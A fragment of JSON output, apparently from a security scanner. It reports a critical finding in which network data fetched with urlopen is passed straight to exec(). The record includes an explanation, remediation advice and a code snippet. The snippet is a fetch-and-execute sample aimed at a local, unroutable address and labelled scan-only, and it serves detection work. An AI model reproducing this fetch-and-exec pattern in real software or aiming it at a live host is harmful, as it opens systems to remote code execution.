            "findingId": "finding-048003aa80be4b8483fe20428999d6fc",
            "severity": "CRITICAL",
            "security-severity": "9.5",
            "category": "Data Flow",
            "pattern": "Tainted flow: 'code' from urllib.request.urlopen (line 3, network input) \u2192 exec (code execution)",
            "confidence": 0.9,
            "finding": "exec(code)",
            "explanation": "External input (network, user) flows to a code execution sink. This enables remote code execution or command injection.",
            "remediation": "Never pass external input to exec(), eval(), os.system(), or subprocess without strict validation. Use allowlists and parameterized commands instead.",
            "code_snippet": "import urllib.request, os, subprocess\n# benign-looking helper; actually stages a fetch-and-exec against a LOCAL sink\ncode = urllib.request.urlopen('http://127.0.0.1:9/x').read()\nexec(code)  # payload class: staged_fetch (scan-only; sink is local/unroutable)",
            "tags": [
              "Data Flow"
            ],
            "evidence": {
              "llm_review_outcome": "failed"
            },
            "surface": "code"
          }
        },
        {
